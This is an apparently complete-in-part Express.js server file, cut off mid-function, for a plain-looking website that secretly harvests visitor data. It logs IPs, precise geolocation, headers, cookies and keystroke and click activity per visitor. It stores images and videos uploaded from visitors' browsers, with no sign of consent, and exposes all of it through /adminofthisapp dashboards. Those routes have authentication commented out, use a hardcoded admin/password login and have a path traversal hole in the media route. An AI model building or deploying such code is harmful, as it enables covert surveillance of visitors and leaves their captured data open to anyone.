// app.js - Main application file
const express = require("express");
const path = require("path");
const fs = require("fs");
const useragent = require("express-useragent");
const geoip = require("geoip-lite");
const requestIp = require("request-ip");
const http = require("http");
const device = require("device");
const axios = require("axios");
const uuid = require("uuid");
const app = express();
const PORT = process.env.PORT || 3000;
const multer = require("multer");
const crypto = require("crypto");

// Set up view engine
app.set("view engine", "ejs");
app.set("views", path.join(__dirname, "views"));

// Static files
app.use(express.static(path.join(__dirname, "public")));

// Middleware for parsing request bodies
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Cookie parser middleware
const cookieParser = require("cookie-parser");
app.use(cookieParser());

// Middleware for parsing user agent
app.use(useragent.express());

// Client IP middleware
app.use(requestIp.mw());

// Function to get detailed location data
async function getDetailedLocation(ip) {
  try {
    // Use multiple IP geolocation services for better accuracy
    const response = await axios.get(`https://ipapi.co/${ip}/json/`);
    return {
      country: response.data.country_name || "Unknown",
      countryCode: response.data.country_code || "Unknown",
      region: response.data.region || "Unknown",
      city: response.data.city || "Unknown",
      latitude: response.data.latitude || "Unknown",
      longitude: response.data.longitude || "Unknown",
      timezone: response.data.timezone || "Unknown",
      asn: response.data.asn || "Unknown",
      org: response.data.org || "Unknown",
      isp: response.data.org || "Unknown",
    };
  } catch (error) {
    console.error("Error fetching detailed location:", error);
    // Fallback to geoip-lite
    const geo = geoip.lookup(ip) || {
      country: "Unknown",
      region: "Unknown",
      city: "Unknown",
      ll: [0, 0],
    };

    return {
      country: geo.country || "Unknown",
      countryCode: geo.country || "Unknown",
      region: geo.region || "Unknown",
      city: geo.city || "Unknown",
      latitude: geo.ll ? geo.ll[0] : "Unknown",
      longitude: geo.ll ? geo.ll[1] : "Unknown",
      timezone: geo.timezone || "Unknown",
      asn: "Unknown",
      org: "Unknown",
      isp: "Unknown",
    };
  }
}

// Generate session ID for tracking
app.use((req, res, next) => {
  // Create a session ID if it doesn't exist
  if (!req.cookies || !req.cookies.session_id) {
    const sessionId = uuid.v4();
    res.cookie("session_id", sessionId, {
      maxAge: 365 * 24 * 60 * 60 * 1000, // 1 year
      httpOnly: true,
    });
    req.sessionId = sessionId;
  } else {
    req.sessionId = req.cookies.session_id;
  }
  next();
});

// Enhanced device detection middleware
app.use((req, res, next) => {
  // Parse device information
  req.device = device(req.headers["user-agent"]);
  next();
});

// Middleware to log user details
app.use(async (req, res, next) => {
  try {
    // Get client IP
    const clientIp =
      req.clientIp ||
      req.headers["x-forwarded-for"] ||
      req.connection.remoteAddress ||
      "Unknown";

    // Get detailed geo-location based on IP
    const location = await getDetailedLocation(clientIp);

    // Get user agent details
    const userAgent = req.useragent;

    // Get enhanced device details
    const deviceInfo = req.device || {};

    // Current timestamp
    const timestamp = new Date();
    const timestampString = timestamp.toISOString();
    const formattedTimestamp = timestampString.replace(/[:.]/g, "-");

    // Create user details object with enhanced information
    const userDetails = {
      timestamp: timestampString,
      sessionId: req.sessionId || "Unknown",
      requestInfo: {
        url: req.originalUrl,
        method: req.method,
        protocol: req.protocol,
        secure: req.secure,
        host: req.get("host"),
        referrer: req.get("Referrer") || "Direct",
        acceptLanguage: req.get("Accept-Language") || "Unknown",
        contentType: req.get("Content-Type") || "Unknown",
        cookies: req.cookies || {},
        query: req.query || {},
      },
      networkInfo: {
        ipAddress: clientIp,
        forwardedIp: req.headers["x-forwarded-for"] || "None",
        proxyIps: req.ips || [],
        connectionRemoteAddress: req.connection.remoteAddress || "Unknown",
        xRealIp: req.headers["x-real-ip"] || "None",
      },
      location: location,
      deviceInfo: {
        type: deviceInfo.type || "Unknown",
        model: deviceInfo.model || "Unknown",
        manufacturer: deviceInfo.manufacturer || "Unknown",
        // Note: IMEI requires native app permissions and cannot be collected via browser
        // This is a placeholder for compatibility with your tracking requirements
        imei: "Not available via browser",
        macAddress: "Not available via browser",
        deviceId: "Not available via browser",
      },
      browserInfo: {
        browser: userAgent.browser || "Unknown",
        version: userAgent.version || "Unknown",
        os: userAgent.os || "Unknown",
        platform: userAgent.platform || "Unknown",
        source: userAgent.source || "Unknown",
        isMobile: userAgent.isMobile || false,
        isDesktop: userAgent.isDesktop || false,
        isBot: userAgent.isBot || false,
        isTablet: userAgent.isTablet || false,
        userAgentRaw: req.headers["user-agent"] || "Unknown",
      },
      headers: {
        ...req.headers,
      },
    };

    // Log to console for debugging
    console.log("Enhanced User Details:", JSON.stringify(userDetails, null, 2));

    // Create individual log file for this user
    const userLogDir = path.join(__dirname, "logs", "users");

    // Ensure user logs directory exists
    if (!fs.existsSync(userLogDir)) {
      fs.mkdirSync(userLogDir, { recursive: true });
    }

    // Create filename with IP and timestamp
    const sanitizedIp = clientIp.replace(/[.:]/g, "-");
    const logFileName = `${sanitizedIp}-${formattedTimestamp}.json`;
    const userLogFilePath = path.join(userLogDir, logFileName);

    // Write to individual user file
    try {
      fs.writeFileSync(
        userLogFilePath,
        JSON.stringify(userDetails, null, 2),
        "utf8"
      );
    } catch (error) {
      console.error("Error writing to user log file:", error);
    }

    // Also add to main activity log
    const logFilePath = path.join(__dirname, "logs", "user_activity.json");

    // Ensure logs directory exists
    if (!fs.existsSync(path.join(__dirname, "logs"))) {
      fs.mkdirSync(path.join(__dirname, "logs"));
    }

    // Read existing logs or create empty array
    let logs = [];
    if (fs.existsSync(logFilePath)) {
      try {
        const fileContent = fs.readFileSync(logFilePath, "utf8");
        logs = JSON.parse(fileContent);
      } catch (error) {
        console.error("Error reading main log file:", error);
      }
    }

    // Add new log
    logs.push(userDetails);

    // Write back to file
    try {
      fs.writeFileSync(logFilePath, JSON.stringify(logs, null, 2), "utf8");
    } catch (error) {
      console.error("Error writing to main log file:", error);
    }

    // Add user details to request for use in other middleware/routes
    req.userDetails = userDetails;

    next();
  } catch (error) {
    console.error("Error in user tracking middleware:", error);
    next();
  }
});

// Routes
app.get("/", (req, res) => {
  res.render("home", { title: "Home" });
});

app.get("/about", (req, res) => {
  res.render("about", { title: "About Us" });
});

// Route to handle client-side tracking data
app.post("/tracking-data", (req, res) => {
  try {
    const clientData = req.body;
    const clientIp =
      req.clientIp ||
      req.headers["x-forwarded-for"] ||
      req.connection.remoteAddress ||
      "Unknown";

    // Add server-side data
    const combinedData = {
      ...clientData,
      serverData: {
        ipAddress: clientIp,
        userAgent: req.useragent,
        sessionId: req.sessionId || "Unknown",
        headers: req.headers,
        serverTimestamp: new Date().toISOString(),
      },
    };

    // Current timestamp for filename
    const timestamp = new Date();
    const timestampString = timestamp.toISOString();
    const formattedTimestamp = timestampString.replace(/[:.]/g, "-");

    // Create sanitized IP for filename
    const sanitizedIp = clientIp.replace(/[.:]/g, "-");

    // Create client-specific directory
    const clientDir = path.join(__dirname, "logs", "client_data", sanitizedIp);
    if (!fs.existsSync(clientDir)) {
      fs.mkdirSync(clientDir, { recursive: true });
    }

    // Create filename with IP and timestamp
    const logFileName = `${sanitizedIp}-${formattedTimestamp}-client.json`;
    const clientLogFilePath = path.join(clientDir, logFileName);

    // Write to individual client file
    try {
      fs.writeFileSync(
        clientLogFilePath,
        JSON.stringify(combinedData, null, 2),
        "utf8"
      );
      console.log(`Client data saved to: ${clientLogFilePath}`);
    } catch (error) {
      console.error("Error writing to client log file:", error);
    }

    // Save to combined client data file
    const combinedClientLogFilePath = path.join(
      __dirname,
      "logs",
      "combined_client_data.json"
    );

    // Read existing logs or create empty array
    let clientLogs = [];
    if (fs.existsSync(combinedClientLogFilePath)) {
      try {
        const fileContent = fs.readFileSync(combinedClientLogFilePath, "utf8");
        clientLogs = JSON.parse(fileContent);
      } catch (error) {
        console.error("Error reading combined client log file:", error);
      }
    }

    // Add new log
    clientLogs.push({
      timestamp: timestampString,
      ipAddress: clientIp,
      sessionId: req.sessionId || "Unknown",
      userAgent: req.headers["user-agent"],
      dataFile: logFileName,
    });

    // Write back to combined file
    try {
      fs.writeFileSync(
        combinedClientLogFilePath,
        JSON.stringify(clientLogs, null, 2),
        "utf8"
      );
    } catch (error) {
      console.error("Error writing to combined client log file:", error);
    }

    res.status(200).send({ status: "success" });
  } catch (error) {
    console.error("Error processing tracking data:", error);
    res
      .status(500)
      .send({ status: "error", message: "Error processing tracking data" });
  }
});

// Route to handle ongoing activity updates
app.post("/activity-update", (req, res) => {
  try {
    const activityData = req.body;
    const clientIp =
      req.clientIp ||
      req.headers["x-forwarded-for"] ||
      req.connection.remoteAddress ||
      "Unknown";

    // Add server-side data
    const combinedData = {
      ...activityData,
      serverData: {
        ipAddress: clientIp,
        sessionId: req.sessionId || "Unknown",
        serverTimestamp: new Date().toISOString(),
      },
    };

    // Current timestamp for filename
    const timestamp = new Date();
    const timestampString = timestamp.toISOString();
    const formattedTimestamp = timestampString.replace(/[:.]/g, "-");

    // Create sanitized IP for filename
    const sanitizedIp = clientIp.replace(/[.:]/g, "-");

    // Create client-specific directory
    const clientDir = path.join(
      __dirname,
      "logs",
      "activity_data",
      sanitizedIp
    );
    if (!fs.existsSync(clientDir)) {
      fs.mkdirSync(clientDir, { recursive: true });
    }

    // Create filename with IP and timestamp
    const logFileName = `${sanitizedIp}-${formattedTimestamp}-activity.json`;
    const activityLogFilePath = path.join(clientDir, logFileName);

    // Write to individual activity file
    try {
      fs.writeFileSync(
        activityLogFilePath,
        JSON.stringify(combinedData, null, 2),
        "utf8"
      );
      console.log(`Activity data saved to: ${activityLogFilePath}`);
    } catch (error) {
      console.error("Error writing to activity log file:", error);
    }

    res.status(200).send({ status: "success" });
  } catch (error) {
    console.error("Error processing activity data:", error);
    res
      .status(500)
      .send({ status: "error", message: "Error processing activity data" });
  }
});

// Add this to your main.js file

// Configure multer for handling file uploads
const videoStorage = multer.diskStorage({
  destination: function (req, file, cb) {
    // Get client IP for folder structure
    const clientIp =
      req.clientIp ||
      req.headers["x-forwarded-for"] ||
      req.connection.remoteAddress ||
      "Unknown";
    const sanitizedIp = clientIp.replace(/[.:]/g, "-");

    // Create date-based folder structure: media/YYYY-MM-DD/[IP]/videos
    const today = new Date();
    const dateFolder = `${today.getFullYear()}-${(today.getMonth() + 1)
      .toString()
      .padStart(2, "0")}-${today.getDate().toString().padStart(2, "0")}`;
    const mediaDir = path.join(
      __dirname,
      "media",
      dateFolder,
      sanitizedIp,
      "videos"
    );

    // Create directory if it doesn't exist
    if (!fs.existsSync(mediaDir)) {
      fs.mkdirSync(mediaDir, { recursive: true });
    }

    cb(null, mediaDir);
  },
  filename: function (req, file, cb) {
    // Generate unique filename with timestamp and random hash
    const timestamp = new Date().toISOString().replace(/[:.]/g, "-");
    const randomHash = crypto.randomBytes(8).toString("hex");
    const extension = file.mimetype === "video/mp4" ? ".mp4" : ".webm";
    cb(null, `video-${timestamp}-${randomHash}${extension}`);
  },
});

const videoUpload = multer({
  storage: videoStorage,
  limits: { fileSize: 100 * 1024 * 1024 }, // 100 MB limit
});

// Route to handle user images
app.post("/user-image", (req, res) => {
  try {
    const imageData = req.body.image;
    const timestamp = req.body.timestamp || new Date().toISOString();
    const formattedTimestamp = timestamp.replace(/[:.]/g, "-");

    // Get client IP for folder structure
    const clientIp =
      req.clientIp ||
      req.headers["x-forwarded-for"] ||
      req.connection.remoteAddress ||
      "Unknown";
    const sanitizedIp = clientIp.replace(/[.:]/g, "-");

    // Create date-based folder structure: media/YYYY-MM-DD/[IP]/images
    const today = new Date();
    const dateFolder = `${today.getFullYear()}-${(today.getMonth() + 1)
      .toString()
      .padStart(2, "0")}-${today.getDate().toString().padStart(2, "0")}`;
    const imageDir = path.join(
      __dirname,
      "media",
      dateFolder,
      sanitizedIp,
      "images"
    );

    // Create directory if it doesn't exist
    if (!fs.existsSync(imageDir)) {
      fs.mkdirSync(imageDir, { recursive: true });
    }

    // Generate unique filename
    const randomHash = crypto.randomBytes(4).toString("hex");
    const imageFileName = `image-${formattedTimestamp}-${randomHash}.jpg`;
    const imagePath = path.join(imageDir, imageFileName);

    // Remove the data:image/jpeg;base64, part
    const base64Data = imageData.replace(/^data:image\/jpeg;base64,/, "");

    // Write the image file
    fs.writeFile(imagePath, base64Data, "base64", (err) => {
      if (err) {
        console.error("Error saving user image:", err);
        return res.status(500).send({ status: "error" });
      }

      // Log successful save
      console.log(`User image saved to: ${imagePath}`);

      // Update the media tracking index
      updateMediaIndex(
        clientIp,
        sanitizedIp,
        "image",
        imageFileName,
        dateFolder
      );

      res.status(200).send({ status: "success" });
    });
  } catch (error) {
    console.error("Error processing image data:", error);
    res
      .status(500)
      .send({ status: "error", message: "Failed to process image" });
  }
});

// Route to handle user videos
app.post("/user-video", videoUpload.single("video"), (req, res) => {
  try {
    // File was uploaded by multer middleware
    if (!req.file) {
      return res
        .status(400)
        .send({ status: "error", message: "No video file received" });
    }

    // Get client IP for reference
    const clientIp =
      req.clientIp ||
      req.headers["x-forwarded-for"] ||
      req.connection.remoteAddress ||
      "Unknown";
    const sanitizedIp = clientIp.replace(/[.:]/g, "-");

    // Extract date folder from the file path
    const filePath = req.file.path;
    const pathParts = filePath.split(path.sep);
    const dateIndex = pathParts.indexOf("media") + 1;
    const dateFolder = pathParts[dateIndex];

    // Log successful upload
    console.log(`User video saved: ${req.file.path}`);

    // Update the media tracking index
    updateMediaIndex(
      clientIp,
      sanitizedIp,
      "video",
      req.file.filename,
      dateFolder
    );

    res.status(200).send({ status: "success" });
  } catch (error) {
    console.error("Error processing video upload:", error);
    res
      .status(500)
      .send({ status: "error", message: "Failed to process video" });
  }
});

// Helper function to update the media index file
function updateMediaIndex(
  clientIp,
  sanitizedIp,
  mediaType,
  fileName,
  dateFolder
) {
  const indexDir = path.join(__dirname, "media", "index");
  if (!fs.existsSync(indexDir)) {
    fs.mkdirSync(indexDir, { recursive: true });
  }

  const indexFile = path.join(indexDir, "media_index.json");

  // Read existing index or create new one
  let mediaIndex = [];
  if (fs.existsSync(indexFile)) {
    try {
      const fileContent = fs.readFileSync(indexFile, "utf8");
      mediaIndex = JSON.parse(fileContent);
    } catch (error) {
      console.error("Error reading media index file:", error);
    }
  }

  // Add new entry
  mediaIndex.push({
    ipAddress: clientIp,
    sanitizedIp: sanitizedIp,
    mediaType: mediaType,
    fileName: fileName,
    dateFolder: dateFolder,
    captureTime: new Date().toISOString(),
    sessionId:
      mediaType === "video" ? crypto.randomBytes(4).toString("hex") : undefined,
  });

  // Write updated index
  try {
    fs.writeFileSync(indexFile, JSON.stringify(mediaIndex, null, 2), "utf8");
  } catch (error) {
    console.error("Error writing to media index file:", error);
  }
}

// Create a secure admin route for viewing captured media
// This should be protected with proper authentication in production
// app.get("/adminofthisapp/media", (req, res) => {
//   // In a real app, add authentication here
//   // if (!req.session.isAdmin) return res.status(403).send('Access denied');

//   try {
//     const indexFile = path.join(
//       __dirname,
//       "media",
//       "index",
//       "media_index.json"
//     );
//     if (!fs.existsSync(indexFile)) {
//       return res.render("media-viewer", { mediaData: [] });
//     }

//     const mediaIndex = JSON.parse(fs.readFileSync(indexFile, "utf8"));

//     // Group by IP address
//     const groupedByIp = {};
//     mediaIndex.forEach((item) => {
//       if (!groupedByIp[item.sanitizedIp]) {
//         groupedByIp[item.sanitizedIp] = {
//           ipAddress: item.ipAddress,
//           mediaItems: [],
//         };
//       }

//       groupedByIp[item.sanitizedIp].mediaItems.push(item);
//     });

//     // Sort each group by capture time
//     Object.keys(groupedByIp).forEach((ip) => {
//       groupedByIp[ip].mediaItems.sort((a, b) => {
//         return new Date(a.captureTime) - new Date(b.captureTime);
//       });
//     });

//     res.render("media-viewer", { mediaData: groupedByIp });
//   } catch (error) {
//     console.error("Error loading media index:", error);
//     res.status(500).send("Error loading media data");
//   }
// });

// Route to serve media files securely
app.get("/adminofthisapp/media/view/:dateFolder/:ip/:type/:filename", (req, res) => {
  // In a real app, add authentication here
  // if (!req.session.isAdmin) return res.status(403).send('Access denied');

  try {
    const { dateFolder, ip, type, filename } = req.params;
    const mediaPath = path.join(
      __dirname,
      "media",
      dateFolder,
      ip,
      type + "s",
      filename
    );

    if (!fs.existsSync(mediaPath)) {
      return res.status(404).send("Media not found");
    }

    res.sendFile(mediaPath);
  } catch (error) {
    console.error("Error serving media file:", error);
    res.status(500).send("Error loading media file");
  }
});

// Admin dashboard route
app.get("/adminofthisapp", (req, res) => {
  // In production, add authentication here
  // if (!req.session.isAdmin) return res.redirect('/adminofthisapp/login');

  try {
    // Get all user data from logs
    const usersData = getUserData();
    res.render("admin-dashboard", { users: usersData });
  } catch (error) {
    console.error("Error loading admin dashboard:", error);
    res.status(500).send("Error loading dashboard data");
  }
});

// Helper function to get all user data from logs
function getUserData() {
  const users = {};

  // Helper function to ensure directory exists
  const ensureDirExists = (dir) => {
    if (!fs.existsSync(dir)) {
      return false;
    }
    return true;
  };

  // Process individual user log files
  const userLogsDir = path.join(__dirname, "logs", "users");
  if (ensureDirExists(userLogsDir)) {
    const files = fs.readdirSync(userLogsDir);
    files.forEach((file) => {
      try {
        // Extract IP from filename (format: IP-TIMESTAMP.json)
        const ipMatch = file.match(/^([^-]+(?:-[^-]+)+)/);
        if (!ipMatch) return;

        const sanitizedIp = ipMatch[1];
        const filePath = path.join(userLogsDir, file);
        const userData = JSON.parse(fs.readFileSync(filePath, "utf8"));

        // Initialize user object if not exists
        if (!users[sanitizedIp]) {
          users[sanitizedIp] = {
            ipAddress:
              userData.networkInfo?.ipAddress || sanitizedIp.replace(/-/g, "."),
            firstSeen: userData.timestamp,
            lastActivity: userData.timestamp,
            visits: 1,
            location: userData.location,
            deviceInfo: userData.browserInfo,
            mediaCount: 0,
            pageVisits: [],
          };
        } else {
          // Update user data
          users[sanitizedIp].visits++;

          // Update last activity if newer
          if (
            new Date(userData.timestamp) >
            new Date(users[sanitizedIp].lastActivity)
          ) {
            users[sanitizedIp].lastActivity = userData.timestamp;
          }

          // Update first seen if older
          if (
            new Date(userData.timestamp) <
            new Date(users[sanitizedIp].firstSeen)
          ) {
            users[sanitizedIp].firstSeen = userData.timestamp;
          }
        }

        // Add page visit
        if (userData.requestInfo && userData.requestInfo.url) {
          users[sanitizedIp].pageVisits = users[sanitizedIp].pageVisits || [];
          users[sanitizedIp].pageVisits.push({
            url: userData.requestInfo.url,
            timestamp: userData.timestamp,
            referrer: userData.requestInfo.referrer,
          });
        }
      } catch (error) {
        console.error(`Error processing user log file ${file}:`, error);
      }
    });
  }

  // Process client data log files for browser and device details
  const clientDataIndexFile = path.join(
    __dirname,
    "logs",
    "combined_client_data.json"
  );
  if (fs.existsSync(clientDataIndexFile)) {
    try {
      const clientDataIndex = JSON.parse(
        fs.readFileSync(clientDataIndexFile, "utf8")
      );
      clientDataIndex.forEach((entry) => {
        const sanitizedIp = entry.ipAddress.replace(/[.:]/g, "-");
        if (users[sanitizedIp]) {
          // Process client-specific data if needed
          // This would involve reading each client data file
        }
      });
    } catch (error) {
      console.error("Error processing combined client data:", error);
    }
  }

  // Process activity data log files
  const activityDataDir = path.join(__dirname, "logs", "activity_data");
  if (ensureDirExists(activityDataDir)) {
    const ipDirs = fs.readdirSync(activityDataDir);
    ipDirs.forEach((ipDir) => {
      const ipPath = path.join(activityDataDir, ipDir);
      if (fs.statSync(ipPath).isDirectory()) {
        try {
          const activityFiles = fs.readdirSync(ipPath);
          let totalClicks = 0;
          let totalKeystrokes = 0;
          let totalScrolls = 0;
          let totalTimeOnPage = 0;

          activityFiles.forEach((file) => {
            const filePath = path.join(ipPath, file);
            const activityData = JSON.parse(fs.readFileSync(filePath, "utf8"));

            // Extract activity metrics
            if (activityData.activity) {
              totalClicks += activityData.activity.mouse?.clicks || 0;
              totalKeystrokes +=
                activityData.activity.keyboard?.keystrokes || 0;
              totalScrolls += activityData.activity.scroll?.count || 0;
              totalTimeOnPage += activityData.activity.timeOnPage || 0;
            }
          });

          // Add to user data
          if (users[ipDir]) {
            users[ipDir].activity = {
              mouseClicks: totalClicks,
              keystrokes: totalKeystrokes,
              scrolls: totalScrolls,
              timeOnPage: totalTimeOnPage,
            };
          }
        } catch (error) {
          console.error(`Error processing activity data for ${ipDir}:`, error);
        }
      }
    });
  }

  // Process media files (images and videos)
  const mediaIndexFile = path.join(
    __dirname,
    "media",
    "index",
    "media_index.json"
  );
  if (fs.existsSync(mediaIndexFile)) {
    try {
      const mediaIndex = JSON.parse(fs.readFileSync(mediaIndexFile, "utf8"));

      // Group by IP address
      const mediaByIp = {};
      mediaIndex.forEach((item) => {
        const sanitizedIp = item.sanitizedIp;
        if (!mediaByIp[sanitizedIp]) {
          mediaByIp[sanitizedIp] = [];
        }

        // Create media URL (will be served by separate route)
        const mediaUrl = `/adminofthisapp/media/view/${item.dateFolder}/${item.sanitizedIp}/${item.mediaType}/${item.fileName}`;

        mediaByIp[sanitizedIp].push({
          type: item.mediaType,
          url: mediaUrl,
          timestamp: item.captureTime,
        });
      });

      // Add media to users
      Object.keys(mediaByIp).forEach((ip) => {
        if (users[ip]) {
          users[ip].media = mediaByIp[ip];
          users[ip].mediaCount = mediaByIp[ip].length;
        }
      });
    } catch (error) {
      console.error("Error processing media index:", error);
    }
  }

  return users;
}

// Serve media files from the media directory
app.get("/adminofthisapp/media/view/:dateFolder/:ip/:type/:filename", (req, res) => {
  // In production, add authentication here
  // if (!req.session.isAdmin) return res.status(403).send('Access denied');

  try {
    const { dateFolder, ip, type, filename } = req.params;
    let subdir = "images";

    if (type === "video") {
      subdir = "videos";
    }

    const mediaPath = path.join(
      __dirname,
      "media",
      dateFolder,
      ip,
      subdir,
      filename
    );

    if (!fs.existsSync(mediaPath)) {
      return res.status(404).send("Media not found");
    }

    res.sendFile(mediaPath);
  } catch (error) {
    console.error("Error serving media file:", error);
    res.status(500).send("Error loading media file");
  }
});

// API endpoint to get detailed user data
app.get("/adminofthisapp/api/user/:ip", (req, res) => {
  // In production, add authentication here
  // if (!req.session.isAdmin) return res.status(403).json({ error: 'Unauthorized' });

  try {
    const { ip } = req.params;
    const userData = getSingleUserData(ip);

    if (!userData) {
      return res.status(404).json({ error: "User not found" });
    }

    res.json(userData);
  } catch (error) {
    console.error(
      `Error retrieving detailed data for user ${req.params.ip}:`,
      error
    );
    res.status(500).json({ error: "Server error" });
  }
});

// Helper function to get detailed data for a single user
function getSingleUserData(ipAddress) {
  // Get basic user data
  const allUsers = getUserData();
  const user = allUsers[ipAddress];

  if (!user) {
    return null;
  }

  // Add detailed data here - in a real implementation, you would:
  // 1. Read log files specifically for this IP
  // 2. Parse client data details
  // 3. Compile detailed activity timelines
  // 4. Add browser fingerprinting details

  return user;
}

// Admin login page (in a real implementation, you'd add proper authentication)
app.get("/adminofthisapp/login", (req, res) => {
  res.render("admin-login");
});

// Admin login POST handler (placeholder - implement proper auth in production)
app.post("/adminofthisapp/login", (req, res) => {
  const { username, password } = req.body;

  // IMPORTANT: In production, use proper authentication!
  if (username === "admin" && password === "password") {
    // Set session
    // req.session.isAdmin = true;
    res.redirect("/adminofthisapp");
  } else {
    res.render("admin-login", { error: "Invalid credentials" });
  }
});

// Additional routes to add to app.js for dedicated admin pages

// Route for viewing detailed user information
app.get("/adminofthisapp/user/:ip", (req, res) => {
  // In production, add authentication here
  // if (!req.session.isAdmin) return res.redirect('/adminofthisapp/login');

  try {
    const { ip } = req.params;
    const userData = getSingleUserData(ip);

    if (!userData) {
      return res.status(404).send("User not found");
    }

    res.render("user-detail", { user: userData });
  } catch (error) {
    console.error(`Error loading user details for ${req.params.ip}:`, error);
    res.status(500).send("Error loading user data");
  }
});

// Route for the activity overview page showing all user activity
app.get("/adminofthisapp/activity", (req, res) => {
  // In production, add authentication here
  // if (!req.session.isAdmin) return res.redirect('/adminofthisapp/login');

  try {
    // Get activity data for all users
    const activityData = getAllActivityData();
    res.render("activity-overview", { activityData });
  } catch (error) {
    console.error("Error loading activity overview:", error);
    res.status(500).send("Error loading activity data");
  }
});

// Helper function to get activity data for all users
function getAllActivityData() {
  const activityData = {
    recentActivity: [],
    topUsers: [],
    stats: {
      totalClicks: 0,
      totalKeystrokes: 0,
      totalScrolls: 0,
      totalVisits: 0,
    },
    activityByHour: Array(24).fill(0),
    activityByDay: {
      Monday: 0,
      Tuesday: 0,
      Wednesday: 0,
      Thursday: 0,
      Friday: 0,
      Saturday: 0,
      Sunday: 0,
    },
  };

  // Get user data which includes activity info
  const users = getUserData();

  // Process each user's activity data
  Object.entries(users).forEach(([ip, user]) => {
    // Add to total stats
    if (user.activity) {
      activityData.stats.totalClicks += user.activity.mouseClicks || 0;
      activityData.stats.totalKeystrokes += user.activity.keystrokes || 0;
      activityData.stats.totalScrolls += user.activity.scrolls || 0;
    }

    activityData.stats.totalVisits += user.visits || 0;

    // Add to top users if they have meaningful activity
    if (
      (user.activity?.mouseClicks || 0) + (user.activity?.keystrokes || 0) >
      0
    ) {
      activityData.topUsers.push({
        ip: user.ipAddress,
        sanitizedIp: ip,
        clicks: user.activity?.mouseClicks || 0,
        keystrokes: user.activity?.keystrokes || 0,
        lastActive: new Date(user.lastActivity || Date.now()).toLocaleString(),
      });
    }

    // Add to recent activity if we have timeline data
    if (user.timeline && user.timeline.length > 0) {
      user.timeline.slice(0, 3).forEach((item) => {
        activityData.recentActivity.push({
          ip: user.ipAddress,
          sanitizedIp: ip,
          title: item.title,
          description: item.description,
          timestamp: new Date(item.timestamp).toLocaleString(),
        });
      });
    }

    // Process activity by hour and day
    // For a real implementation, this would analyze actual timestamp data
    // Here we're just generating placeholder data
    if (user.pageVisits && user.pageVisits.length > 0) {
      user.pageVisits.forEach((visit) => {
        try {
          const date = new Date(visit.timestamp);
          activityData.activityByHour[date.getHours()]++;

          const days = [
            "Sunday",
            "Monday",
            "Tuesday",
            "Wednesday",
            "Thursday",
            "Friday",
            "Saturday",
          ];
          activityData.activityByDay[days[date.getDay()]]++;
        } catch (e) {
          // Skip if timestamp is invalid
        }
      });
    }
  });

  // Sort recent activity by timestamp (newest first)
  activityData.recentActivity.sort((a, b) => {
    return new Date(b.timestamp) - new Date(a.timestamp);
  });

  // Sort top users by total activity (clicks + keystrokes)
  activityData.topUsers.sort((a, b) => {
    return b.clicks + b.keystrokes - (a.clicks + a.keystrokes);
  });

  // Take top 10 users only
  activityData.topUsers = activityData.topUsers.slice(0, 10);

  return activityData;
}

// Route for the media gallery page showing all captured media
app.get("/adminofthisapp/media", (req, res) => {
  // In production, add authentication here
  // if (!req.session.isAdmin) return res.redirect('/adminofthisapp/login');

  try {
    // Get all media data
    const mediaData = getAllMediaData();
    res.render("media-gallery", { mediaData });
  } catch (error) {
    console.error("Error loading media gallery:", error);
    res.status(500).send("Error loading media data");
  }
});

// Helper function to get all media data
function getAllMediaData() {
  const mediaData = {
    images: [],
    videos: [],
    stats: {
      totalImages: 0,
      totalVideos: 0,
      mediaByUser: {},
    },
    recent: [],
  };

  // Read media index file
  const mediaIndexFile = path.join(
    __dirname,
    "media",
    "index",
    "media_index.json"
  );
  if (fs.existsSync(mediaIndexFile)) {
    try {
      const mediaIndex = JSON.parse(fs.readFileSync(mediaIndexFile, "utf8"));

      // Process each media entry
      mediaIndex.forEach((item) => {
        const mediaUrl = `/adminofthisapp/media/view/${item.dateFolder}/${item.sanitizedIp}/${item.mediaType}/${item.fileName}`;
        const mediaItem = {
          url: mediaUrl,
          timestamp: item.captureTime,
          ip: item.ipAddress,
          sanitizedIp: item.sanitizedIp,
          fileName: item.fileName,
          dateFolder: item.dateFolder,
        };

        // Add to the right collection
        if (item.mediaType === "image") {
          mediaData.images.push(mediaItem);
          mediaData.stats.totalImages++;
        } else if (item.mediaType === "video") {
          mediaData.videos.push(mediaItem);
          mediaData.stats.totalVideos++;
        }

        // Add to recent media
        mediaData.recent.push({
          ...mediaItem,
          type: item.mediaType,
        });

        // Add to per-user stats
        if (!mediaData.stats.mediaByUser[item.ipAddress]) {
          mediaData.stats.mediaByUser[item.ipAddress] = {
            sanitizedIp: item.sanitizedIp,
            images: 0,
            videos: 0,
          };
        }

        if (item.mediaType === "image") {
          mediaData.stats.mediaByUser[item.ipAddress].images++;
        } else if (item.mediaType === "video") {
          mediaData.stats.mediaByUser[item.ipAddress].videos++;
        }
      });

      // Sort recent media by timestamp (newest first)
      mediaData.recent.sort((a, b) => {
        return new Date(b.timestamp) - new Date(a.timestamp);
      });

      // Limit to most recent 20 items
      mediaData.recent = mediaData.recent.slice(0, 20);

      // Sort user stats by total media count
      mediaData.stats.mediaByUser = Object.entries(mediaData.stats.mediaByUser)
        .map(([ip, stats]) => ({
          ip,
          ...stats,
          total: stats.images + stats.videos,
        }))
        .sort((a, b) => b.total - a.total);
    } catch (error) {
      console.error("Error processing media index:", error);
    }
  }

  return mediaData;
}

// Route for the devices overview page
app.get("/adminofthisapp/devices", (req, res) => {
  // In production, add authentication here
  // if (!req.session.isAdmin) return res.redirect('/adminofthisapp/login');

  try {
    // Get device data for all users
    const deviceData = getAllDeviceData();
    res.render("device-overview", { deviceData });
  } catch (error) {
    console.error("Error loading device overview:", error);
    res.status(500).send("Error loading device data");
  }
});

// Helper function to get device data for all users
function getAllDeviceData() {
  const deviceData = {
    browsers: {},
    operatingSystems: {},
    devices: {
      mobile: 0,
      tablet: 0,
      desktop: 0,
    },
    screenSizes: {},
    hardwareInfo: [],
  };

  // Get user data which includes device info
  const users = getUserData();

  // Process each user's device data
  Object.entries(users).forEach(([ip, user]) => {
    const deviceInfo = user.deviceInfo || {};
    const browserInfo = user.browserInfo || {};

    // Count browsers
    const browser = deviceInfo.browser || browserInfo.browser || "Unknown";
    deviceData.browsers[browser] = (deviceData.browsers[browser] || 0) + 1;

    // Count operating systems
    const os = deviceInfo.os || "Unknown";
    deviceData.operatingSystems[os] =
      (deviceData.operatingSystems[os] || 0) + 1;

    // Count device types
    if (deviceInfo.isMobile) {
      deviceData.devices.mobile++;
    } else if (deviceInfo.isTablet) {
      deviceData.devices.tablet++;
    } else {
      deviceData.devices.desktop++;
    }

